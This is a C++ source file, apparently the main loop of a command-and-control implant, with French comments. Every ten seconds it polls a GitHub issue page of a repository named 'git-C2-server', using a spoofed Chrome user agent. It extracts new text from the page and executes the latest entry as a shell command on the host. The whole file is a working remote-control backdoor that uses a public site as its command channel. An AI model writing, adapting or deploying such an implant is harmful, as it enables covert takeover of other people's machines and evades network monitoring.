#include "include/httpRequest.hpp"
#include "include/fileManager.hpp"
#include "include/htmlParser.hpp"
#include "include/cmd.hpp"
#include "include/execCmd.hpp"
#include <iostream>
#include <chrono>
#include <thread>
#include <string>  // Ajoutez cette ligne pour inclure la bibliothèque string
#include <vector>  // Ajoutez cette ligne pour inclure la bibliothèque vector

int main() {
    HttpRequest httpRequest;
    
    std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
    std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

    Cmd cmd;
    HtmlParser htmlParser(cmd);
    ExecCmd execCmd("");  // Créez une instance d'ExecCmd avec une commande vide

    std::size_t previousMatchCount = 0;  // Ajoutez cette ligne pour stocker le nombre précédent de matchs

    while (true) {
        // Effectuer la requête et extraire le contenu
        std::string response = httpRequest.get(url, userAgent);
        std::string extractedContent = htmlParser.extractContent(response);

        // Vérifier si le nombre de contenus a augmenté
        if (cmd.addContentIfChanged(extractedContent)) {
            const std::vector<std::string>& allContent = cmd.getAllContent();

            // Afficher le dernier contenu extrait
            const std::string& lastContent = cmd.getLastContent();

            // Vérifier si le nombre de matchs a changé depuis la dernière vérification
            if (htmlParser.getcmd_number() != previousMatchCount) {
                // Afficher tous les contenus extraits
                std::cout << "All extracted content:\n";
                for (const auto& content : allContent) {
                    std::cout << content << std::endl;
                }

                std::cout << "Last extracted content:\n" << lastContent << std::endl;

                // Exécuter uniquement la dernière commande extraite
                ExecCmd execCmd(lastContent);
                execCmd.executeCommand();

                // Mettre à jour le nombre précédent de matchs
                previousMatchCount = htmlParser.getcmd_number();
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}
